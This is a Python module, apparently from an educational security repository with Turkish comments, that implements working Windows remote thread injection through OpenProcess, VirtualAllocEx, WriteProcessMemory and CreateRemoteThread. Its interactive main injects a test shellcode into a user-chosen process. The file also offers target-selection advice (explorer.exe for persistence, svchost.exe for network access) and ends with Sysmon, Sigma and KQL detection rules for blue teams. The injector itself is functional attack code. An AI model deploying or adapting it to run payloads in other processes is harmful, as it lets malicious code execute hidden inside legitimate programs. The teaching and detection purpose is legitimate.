"""
Technique 2: Remote Thread Injection (CreateRemoteThread)
==========================================================
Klasik shellcode injection - Başka bir process'e enjekte eder.

MITRE ATT&CK: T1055.001 - Process Injection: Dynamic-link Library Injection

API Çağrı Sırası:
1. OpenProcess() - Hedef process'e handle al
2. VirtualAllocEx() - Hedef process'te bellek ayır
3. WriteProcessMemory() - Shellcode'u yaz
4. VirtualProtectEx() - İzinleri değiştir (opsiyonel)
5. CreateRemoteThread() - Remote thread oluştur

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.win_api import (
    OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx,
    CreateRemoteThread, CloseHandle, WaitForSingleObject,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    PAGE_EXECUTE_READ, PROCESS_ALL_ACCESS, INFINITE, GetLastError
)

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                   TECHNIQUE 2: REMOTE THREAD INJECTION                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AÇIKLAMA:                                                                ║
║  ─────────────                                                               ║
║  En yaygın kullanılan process injection tekniği. Shellcode, başka bir        ║
║  çalışan process'in bellek alanına yazılır ve o process'te yeni bir          ║
║  thread oluşturularak çalıştırılır.                                          ║
║                                                                              ║
║  🔄 API ÇAĞRI AKIŞI:                                                         ║
║  ───────────────────                                                         ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                         ATTACKER PROCESS                            │    ║
║  │                                                                     │    ║
║  │  ┌─────────────┐      ┌──────────────────────────────────────────┐ │    ║
║  │  │ OpenProcess │ ──── │ Handle to TARGET PROCESS                 │ │    ║
║  │  └──────┬──────┘      └──────────────────────────────────────────┘ │    ║
║  │         │                                                          │    ║
║  │         ▼                                                          │    ║
║  │  ┌──────────────┐                                                  │    ║
║  │  │VirtualAllocEx│ ───► Allocate memory in TARGET                   │    ║
║  │  └──────┬───────┘                                                  │    ║
║  │         │                                                          │    ║
║  │         ▼                                                          │    ║
║  │  ┌─────────────────┐                                               │    ║
║  │  │WriteProcessMem  │ ───► Write shellcode to TARGET                │    ║
║  │  └──────┬──────────┘                                               │    ║
║  │         │                                                          │    ║
║  │         ▼                                                          │    ║
║  │  ┌──────────────────┐                                              │    ║
║  │  │CreateRemoteThread│ ───► Create thread in TARGET to run code     │    ║
║  │  └──────────────────┘                                              │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║                              ║                                               ║
║                              ▼                                               ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                         TARGET PROCESS                              │    ║
║  │  (örn: notepad.exe, explorer.exe)                                   │    ║
║  │                                                                     │    ║
║  │  ┌────────────────────────────────────────────────────────────┐    │    ║
║  │  │                    INJECTED MEMORY                          │    │    ║
║  │  │  ┌─────────────────────────────────────────────────────┐   │    │    ║
║  │  │  │  SHELLCODE                                          │   │    │    ║
║  │  │  │  fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 ...   │   │    │    ║
║  │  │  └─────────────────────────────────────────────────────┘   │    │    ║
║  │  │              ▲                                              │    │    ║
║  │  │              │                                              │    │    ║
║  │  │  ┌──────────┴───────────┐                                   │    │    ║
║  │  │  │   NEW REMOTE THREAD  │ ◄── Executes shellcode            │    │    ║
║  │  │  └──────────────────────┘                                   │    │    ║
║  │  └────────────────────────────────────────────────────────────┘    │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🎯 HEDEF SEÇİMİ:                                                            ║
║  ─────────────────                                                           ║
║  • notepad.exe - Test için ideal, zararsız                                   ║
║  • explorer.exe - Her zaman çalışır, kalıcı                                  ║
║  • svchost.exe - Ağ erişimi için tercih edilir                              ║
║                                                                              ║
║  ⚠️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • OpenProcess ile PROCESS_ALL_ACCESS                                        ║
║  • Cross-process VirtualAllocEx                                              ║
║  • Cross-process WriteProcessMemory                                          ║
║  • CreateRemoteThread (çok iyi izlenir!)                                     ║
║                                                                              ║
║  🛡️ NEDEN TESPİT EDİLİR:                                                     ║
║  ─────────────────────────                                                   ║
║  CreateRemoteThread, AV/EDR tarafından EN ÇOK izlenen API'dir!              ║
║  Neredeyse tüm güvenlik ürünleri bu çağrıyı yakalar.                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def find_process_by_name(process_name: str) -> int:
    """
    Process adına göre PID bul.
    
    Args:
        process_name: Process adı (örn: "notepad.exe")
    
    Returns:
        int: PID veya 0 (bulunamazsa)
    """
    import subprocess
    
    try:
        # tasklist ile process listele
        output = subprocess.check_output(
            ['tasklist', '/FI', f'IMAGENAME eq {process_name}', '/FO', 'CSV'],
            text=True
        )
        
        lines = output.strip().split('\n')
        if len(lines) > 1:  # Header + en az bir process
            # CSV formatı: "Image Name","PID","Session Name","Session#","Mem Usage"
            parts = lines[1].split(',')
            pid = int(parts[1].strip('"'))
            return pid
    except:
        pass
    
    return 0

def list_injectable_processes():
    """Test için enjekte edilebilir process'leri listele"""
    import subprocess
    
    print("\n📋 Çalışan Process'ler:")
    print("-" * 60)
    
    targets = ['notepad.exe', 'calc.exe', 'mspaint.exe', 'explorer.exe']
    
    for target in targets:
        pid = find_process_by_name(target)
        if pid:
            print(f"   ✅ {target:<20} PID: {pid}")
        else:
            print(f"   ❌ {target:<20} Çalışmıyor")
    
    print("-" * 60)
    print("💡 İpucu: notepad.exe açarak test edebilirsiniz")

# ============================================================================
# REMOTE INJECTION
# ============================================================================

def inject_remote(shellcode: bytes, target_pid: int, verbose: bool = True) -> bool:
    """
    Remote Thread Injection - Klasik yöntem.
    
    Args:
        shellcode: Çalıştırılacak shellcode
        target_pid: Hedef process PID'i
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print(f"\n🎯 Hedef PID: {target_pid}")
        print("="*60)
    
    # Step 1: Open target process
    if verbose:
        print("\n[1/5] OpenProcess() - Hedef process'e handle alma...")
    
    process_handle = OpenProcess(
        PROCESS_ALL_ACCESS,     # dwDesiredAccess
        False,                  # bInheritHandle
        target_pid              # dwProcessId
    )
    
    if not process_handle:
        print(f"❌ OpenProcess başarısız! Error: {GetLastError()}")
        print("   💡 İpucu: Admin yetkisi gerekebilir veya process korumalı")
        return False
    
    if verbose:
        print(f"   ✅ Handle alındı: 0x{process_handle:X}")
    
    try:
        # Step 2: Allocate memory in target process
        if verbose:
            print("\n[2/5] VirtualAllocEx() - Hedef process'te bellek ayırma...")
        
        remote_addr = VirtualAllocEx(
            process_handle,             # hProcess
            None,                       # lpAddress (NULL = sistem seçer)
            len(shellcode),             # dwSize
            MEM_COMMIT | MEM_RESERVE,   # flAllocationType
            PAGE_READWRITE              # flProtect (önce RW)
        )
        
        if not remote_addr:
            print(f"❌ VirtualAllocEx başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Remote bellek ayrıldı: 0x{remote_addr:016X}")
            print(f"   📏 Boyut: {len(shellcode)} bytes")
        
        # Step 3: Write shellcode to target process
        if verbose:
            print("\n[3/5] WriteProcessMemory() - Shellcode yazma...")
        
        bytes_written = ctypes.c_size_t(0)
        result = WriteProcessMemory(
            process_handle,             # hProcess
            remote_addr,                # lpBaseAddress
            shellcode,                  # lpBuffer
            len(shellcode),             # nSize
            ctypes.byref(bytes_written) # lpNumberOfBytesWritten
        )
        
        if not result:
            print(f"❌ WriteProcessMemory başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Yazılan: {bytes_written.value} bytes")
        
        # Step 4: Change memory protection to RX
        if verbose:
            print("\n[4/5] VirtualProtectEx() - RW → RX değiştirme...")
        
        old_protect = wintypes.DWORD()
        result = VirtualProtectEx(
            process_handle,
            remote_addr,
            len(shellcode),
            PAGE_EXECUTE_READ,          # RX - executable
            ctypes.byref(old_protect)
        )
        
        if not result:
            print(f"⚠️ VirtualProtectEx başarısız (devam ediliyor)")
        else:
            if verbose:
                print(f"   ✅ İzinler değiştirildi: RW → RX")
        
        # Step 5: Create remote thread
        if verbose:
            print("\n[5/5] CreateRemoteThread() - Remote thread oluşturma...")
            print("   ⚠️ BU API EN ÇOK İZLENEN API'DİR!")
        
        thread_id = wintypes.DWORD()
        thread_handle = CreateRemoteThread(
            process_handle,             # hProcess
            None,                       # lpThreadAttributes
            0,                          # dwStackSize
            remote_addr,                # lpStartAddress (shellcode)
            None,                       # lpParameter
            0,                          # dwCreationFlags
            ctypes.byref(thread_id)     # lpThreadId
        )
        
        if not thread_handle:
            print(f"❌ CreateRemoteThread başarısız! Error: {GetLastError()}")
            return False
        
        if verbose:
            print(f"   ✅ Remote thread oluşturuldu!")
            print(f"   🧵 Thread Handle: 0x{thread_handle:X}")
            print(f"   🆔 Thread ID: {thread_id.value}")
        
        # Wait for completion
        WaitForSingleObject(thread_handle, 5000)  # 5 saniye bekle
        
        CloseHandle(thread_handle)
        
        if verbose:
            print("\n" + "="*60)
            print("🎉 REMOTE INJECTION BAŞARILI!")
            print(f"   Hedef PID: {target_pid}")
            print(f"   Injection adresi: 0x{remote_addr:016X}")
            print("="*60)
        
        return True
        
    finally:
        CloseHandle(process_handle)

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 SYSMON RULES:                                                            ║
║  ─────────────────                                                           ║
║                                                                              ║
║  <!-- Event ID 8: CreateRemoteThread -->                                     ║
║  <RuleGroup name="RemoteThreadInjection" groupRelation="or">                 ║
║    <CreateRemoteThread onmatch="include">                                    ║
║      <SourceImage condition="is not">C:\\Windows\\System32\\*</SourceImage>  ║
║    </CreateRemoteThread>                                                     ║
║  </RuleGroup>                                                                ║
║                                                                              ║
║  <!-- Event ID 10: ProcessAccess with VM_WRITE -->                           ║
║  <ProcessAccess onmatch="include">                                           ║
║    <GrantedAccess condition="contains">0x20</GrantedAccess>                  ║
║  </ProcessAccess>                                                            ║
║                                                                              ║
║  📋 SIGMA RULE:                                                              ║
║  ──────────────                                                              ║
║                                                                              ║
║  title: CreateRemoteThread Injection                                         ║
║  status: experimental                                                        ║
║  logsource:                                                                  ║
║    product: windows                                                          ║
║    service: sysmon                                                           ║
║  detection:                                                                  ║
║    selection:                                                                ║
║      EventID: 8                                                              ║
║    filter:                                                                   ║
║      SourceImage|endswith:                                                   ║
║        - '\\csrss.exe'                                                       ║
║        - '\\wininit.exe'                                                     ║
║    condition: selection and not filter                                       ║
║  level: high                                                                 ║
║                                                                              ║
║  📋 KQL QUERY (Defender for Endpoint):                                       ║
║  ─────────────────────────────────────                                       ║
║                                                                              ║
║  DeviceEvents                                                                ║
║  | where ActionType == "CreateRemoteThreadApiCall"                           ║
║  | where InitiatingProcessId != TargetProcessId  // Cross-process            ║
║  | project Timestamp, DeviceName,                                            ║
║            InitiatingProcessFileName, InitiatingProcessId,                   ║
║            TargetProcessFileName, TargetProcessId,                           ║
║            RemoteThreadId                                                    ║
║  | where InitiatingProcessFileName !in ("csrss.exe", "services.exe")        ║
║                                                                              ║
║  📋 KQL - Memory Allocation in Remote Process:                               ║
║  ─────────────────────────────────────────────                               ║
║                                                                              ║
║  DeviceEvents                                                                ║
║  | where ActionType == "NtAllocateVirtualMemoryRemoteApiCall"               ║
║  | project Timestamp, DeviceName,                                            ║
║            InitiatingProcessFileName,                                        ║
║            TargetProcessFileName,                                            ║
║            AdditionalFields                                                  ║
║                                                                              ║
║  📋 ETW PROVIDERS:                                                           ║
║  ─────────────────                                                           ║
║  • Microsoft-Windows-Kernel-Process                                          ║
║  • Microsoft-Windows-Threat-Intelligence (Requires PPL)                      ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║  • Process A opens Process B with PROCESS_VM_WRITE                           ║
║  • Memory allocated in remote process (VirtualAllocEx)                       ║
║  • Data written to remote process (WriteProcessMemory)                       ║
║  • Thread created in remote process (CreateRemoteThread)                     ║
║  • Unusual parent-child relationships                                        ║
║  • Network connection from injected process                                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    # List available processes
    list_injectable_processes()
    
    # Get target
    print("\n" + "="*60)
    target_name = input("🎯 Hedef process adı (örn: notepad.exe): ").strip()
    
    if not target_name:
        target_name = "notepad.exe"
    
    target_pid = find_process_by_name(target_name)
    
    if not target_pid:
        print(f"❌ {target_name} bulunamadı!")
        print(f"   💡 Önce {target_name}'yi açın")
        sys.exit(1)
    
    print(f"   ✅ {target_name} bulundu: PID {target_pid}")
    
    # Load shellcode
    try:
        from payloads.test_shellcodes import CALC_SHELLCODE_X64
        shellcode = CALC_SHELLCODE_X64
        print(f"\n📦 Shellcode yüklendi: {len(shellcode)} bytes")
    except ImportError:
        print("⚠️ Test shellcode bulunamadı")
        shellcode = bytes([0x90] * 100 + [0xC3])
    
    # Confirm
    confirm = input("\n⚠️ Injection yapılsın mı? (y/n): ").strip().lower()
    if confirm != 'y':
        print("İptal edildi.")
        sys.exit(0)
    
    # Inject
    inject_remote(shellcode, target_pid)
    
    # Print detection rules
    print(DETECTION_RULES)
